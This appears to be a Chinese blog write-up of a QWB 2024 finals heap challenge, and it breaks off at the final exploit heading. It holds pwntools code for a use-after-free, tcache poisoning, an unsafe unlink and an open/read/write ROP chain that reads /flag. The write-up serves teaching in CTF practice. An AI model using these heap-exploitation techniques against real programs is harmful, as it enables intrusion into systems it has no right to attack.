    <published>2024-12-07T17:00:00.000Z</published>
    <updated>2025-01-16T12:47:03.578Z</updated>
    
    <content type="html"><![CDATA[<p>同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</p><span id="more"></span><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p><a href="heap_56fc53234d59e2df8d0d87941a8b8134.zip">附件下载</a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>这题一开始最大的一个问题可能是题目依赖较多跑不起来，而且只给了 libc 的版本，是 <code>2.31 9.16</code> 版本，这个比较好说。如果是 libcrypto.1.1 这个库不存在也好说，apt 安装就好了。</p><p>照常换了 runpath 和链接器之后报了一个神奇的错误。</p><img src="/2024/12/08/qwb2024_final/1.png" class=""><p>这里的意思就是，虽然你 elf 文件的 libc 换好了，但是 libcrypto.so.1 这个库用的是高版本的 libc，你换了之后 libcrypto.so.1 有些引用了高版本 glibc 的函数就用不了了，所以索性在加载的时候报出错误存在这个问题。</p><p>解决这个问题也很简单，如果不想影响机器的 libcrypto 库那就复制一份出来，将依赖修改到本地的备份版本即可，再用 –replace-needed 参数去替换依赖库。</p><p>例子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libcrypto.so.1.1 ./libcrypto.so.1.1 ./heap</span><br></pre></td></tr></table></figure><p>此时你还需要将 libcrypto.so.1.1 的依赖库换成对应的版本，才能正常运行。</p><p>最终修改完以来之后，你的两个文件依赖项应该如下所示：</p><img src="/2024/12/08/qwb2024_final/2.png" class=""><p>这样你就能正常运行这个题目了。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目很友好，没有去符号，init_system 里面初始化了 Key，heap_base，和沙箱。</p><img src="/2024/12/08/qwb2024_final/3.png" class=""><p>沙箱就是简单地禁用了 execve 调用，增删改查一应俱全，一步步分析。</p><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><img src="/2024/12/08/qwb2024_final/4.png" class=""><p>下标 0-15还挺大，固定分配 0x30 大小的堆块，读入也是这么长，随后使用 AES 加密保存输入的内容。</p><p>注意到使用了 safe_malloc，而 safe_malloc 检查了 malloc 的返回值，需要与 key 所分配的堆块在同一个页上（即地址除了最低三位十六进制不同，其它必须相同），这样就会导致我们很多漏洞不能利用。</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><img src="/2024/12/08/qwb2024_final/5.png" class=""><p>明显是存在 UAF 漏洞的。</p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><img src="/2024/12/08/qwb2024_final/6.png" class=""><p>同样 AES 加密内容改了上去。</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><img src="/2024/12/08/qwb2024_final/7.png" class=""><p>将堆块内容 AES 解密后输出。</p><h4 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h4><img src="/2024/12/08/qwb2024_final/8.png" class=""><p>可以观察到，当 <code>a2 &lt; 16</code> 的时候是不会进行加密的，也就是说输入的明文会直接存储到堆上，解密函数同理。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>UAF是主要的漏洞点，根据UAF可以搞很多事，同时也有许多限制，来列一下目前的限制：</p><ol><li>堆块分配的地址被定死在了堆首的第一个页</li><li>输入的内容超过16字节会被随机Key加密。</li><li>沙箱保护</li></ol><p>对应的解决措施如下：</p><ol><li>堆块指针被限制了那么就可以不用堆块分配指针，而是直接劫持指针，而堆攻击手法里面可以直接劫持指针的方法就是 unsafe unlink了。</li><li>被随机密钥加密首先就想到，可以利用一个 tcache bin attack 劫持 key 所在的堆块，将密钥强制写为 0 字节，这样密钥就等于已知，但是密钥有 16 个长度怎么办呢？刚好 2.31 tcache 取出 free 块的时候会清空 bk 指针，因此写入 8 字节就可以达到清空 Key 的目的。</li><li>沙箱保护 orw 即可绕过。</li></ol><p>理论可行，下面来实践</p><h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>据此构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br></pre></td></tr></table></figure><p>由于 unsafe unlink 的利用手法需要知道堆指针的地址，而题目程序开了 PIE，所以第一步要先想办法泄露程序的基地址。</p><p>注意到解密函数是将内容解密到栈上输出的，因此栈上可能有可以利用的地址。</p><img src="/2024/12/08/qwb2024_final/9.png" class=""><p>0x20 个 a 扔过去发现的确存在一个程序基地址，虽然被覆盖了两个字节，但是依稀可辨。在比赛中我选择了爆破这半个字节，但其实完全没必要，因为可以发现被覆盖的两个字节是由于自己输入了 <code>3\n</code>，而这里的数字输入显然使用 read，那就没必要输入这个回车，可以少覆盖一个字节，这样就完全不用爆破。</p><p>将交互函数的 line 去掉如下所示</p><img src="/2024/12/08/qwb2024_final/10.png" class=""><p>拿到了 code_base 之后，tcache bin attack，这里这样操作：free 两个堆块，再改最后进入的堆块的 fd 指针到 key 堆块的位置。因为 2.31 版本的 tcache 有数量检查，如果检查到数量为0，即使 tcache存的堆块指针不为 0，那也不会被分配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure><p>成功将 Key 写为 0</p><img src="/2024/12/08/qwb2024_final/11.png" class=""><p>之后尝试泄露一下 heap 的地址，因为需要构造 unsorted bin，需要堆重叠修改 size，因此这里泄露堆地址是比较方便的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>也很简单，free 一个块让它带地址直接 show 即可，但是会用 Key 解密之后输出，因此我们想要得到原堆块的地址就需要对结果进行加密，密钥已知，也是很容易得出的。</p><img src="/2024/12/08/qwb2024_final/12.png" class=""><p>紧接着再来一个 tcache bin attack，构造堆重叠，修改堆块的大小，free 掉，得到 unsorted bin，泄露得 libc 的地址（同时后面也是知道，我都unsafe unlink了，我还泄露libc地址干嘛呢？？）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里我用了 14 这个下标是因为这个地方的指针比较重要（做到后面才发现的）。</p><p>此刻，便是良机，构造 unsafe unlink。</p><h4 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h4><p>讲解一下 unsafe unlink 的原理，glibc 除了 tcache bin 和 fastbin 是单链表管理之外，其余都是双链表管理，单链表管理的堆块普遍不参与相邻内存合并（consolidate）的操作。</p><p>而合并操作需要涉及解链（unlink），为什么需要解链才能合并。因为合并后得到是一个新的大小的堆块，不管是 small bin 还是 largebin，对大小都有严格的限制，所以合并必须 unlink。</p><p>解链我们找找 glibc 中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到解链的一个重要操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果对应的堆块本身不处于被释放状态，意味着这个堆块的fd和bk指针我可以任意的修改。而合并是通过什么样的检测去判断呢，它有向前和向后两种合并的方式，从 glibc 源码中也不难看出，当 free 的一个块不在 fastbin 大小的范围内，便会尝试向前和向后合并。</p><p>向后合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向前合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以发现，向后合并（向较小地址）主要依赖于当前释放的这个堆块的 prev_inuse 位，如果为0证明前面（较小地址）的堆块被释放了，就要向后合并，而一旦这个位为0，则检查 prev_size 字段判断堆块的大小。</p><p>同时再来看看如果没有任何检查的 unsafe unlink 会发生什么。</p><p>由于 fd 和 bk 是我任意控制的，因此我可以将 fd+0x18 的地址写上 bk 值，将 bk+0x10 的地址写上 fd 的值。但是很不幸的，它检查了 <code>p-&gt;fd-&gt;bk==p &amp;&amp; p-&gt;bk-&gt;fd==p</code>，满足这些条件才能 unlink，本意很简单，一个正常的双向链表中，任意一个链表中的元素的后一个块的前一个块肯定是自己，反之同理，如果不满足则双向链表肯定发生了问题。</p><p>当然这个 check 可以绕过，首先需要一个指向 chunk 头部的指针，因此这需要我们伪造一个 chunk，而chunk头部的指针当然就是可以用分配得到的用户指针，它存放在程序代码的 bss 段中。</p><p>把 check 的条件化简一下，因为 <code>p-&gt;fd</code> 和 <code>p-&gt;bk</code> 都是任意值，因此不妨将它设为 x 和 y，那么就变成了 <code>x-&gt;bk==p &amp;&amp; y-&gt;fd==p</code>，而 <code>x-&gt;fd</code> 与 <code>y-&gt;bk</code> 转为指针的写法就是 <code>*(void **)(x+0x18)=p&amp;&amp;*(void **)(y+0x10)=p</code>，取第一个等式，对等号两边同时取地址得到 <code>(x+0x10)=&amp;p</code> 那么 <code>x=&amp;p-0x18</code> 同理 <code>y=&amp;p-0x10</code>。那么绕过这个检查的主要就是需要找到一个指向头部的指针。</p><hr><p>在上面的基础，用下面的代码，我们来观察 unsafe unlink 的图解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>结果如下</p><img src="/2024/12/08/qwb2024_final/13.png" class=""><p>在这里，我分配了一个0x40的堆块，返回了 <code>0x55555555c350</code> 这个指针，通过堆重叠，在 0x40 的堆块里面包含了一个 0x30 的堆块，可以发现 0x40 指向分配给用户的指针指向了 0x30 这个堆块的头部，这是我们伪造的一个 fake chunk，这里其实不需要加 0x31 这个size，因为 unlink不检查这个size，这里写 0x31 主要是方便理解。</p><p>同时它的 fd 和 bk，分别赋值了 <code>0x0000555555558080</code> 和 <code>0x0000555555558088</code>，这个值其实就是因为我们伪造的堆块得到了一个指向头部的指针在 BookList 全局数组当中，因此上面的等式中的 &amp;p 就有了，不难发现 <code>&amp;p = 0x555555558090</code>，那么根据前面的 x 和 y 相关方程可得 <code>x=0x0000555555558080</code>，<code>y=0x0000555555558088</code>，分别对应了这里的 fd 和 bk 的位置。</p><p>最后需要伪造 prevsize 为 0x30 和将 size 的prev_inuse设置为0，才能够成功触发 unsafe unlink。</p><p>触发了 unsafe unlink 之后，可以发现，BookList[3] 得到了一个指向自身 - 0x18 的位置，同时合并堆块的操作也是成功的，这里大小为 0x421 是因为后面还有 free 块，向前也合并了。</p><img src="/2024/12/08/qwb2024_final/14.png" class=""><p>有了这个指针，可以任意修改 BookList[0]的值，再通过 BookList[0] 指针取读写任意的地址。此刻，malloc 已经不被需要了，我已然是无敌的状态。</p><p>这里选择劫持通过 <code>__environ</code> 泄露栈，用栈迁移劫持栈到堆上，在堆上提前布置好 ROP 链进行 ORW 即可。</p><p>想必也是可以一气呵成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>至此，已成艺术</p><img src="/2024/12/08/qwb2024_final/15.png" class=""><h3 id="最终-EXP"><a href="#最终-EXP" class="headerlink" title="最终 EXP"></a>最终 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 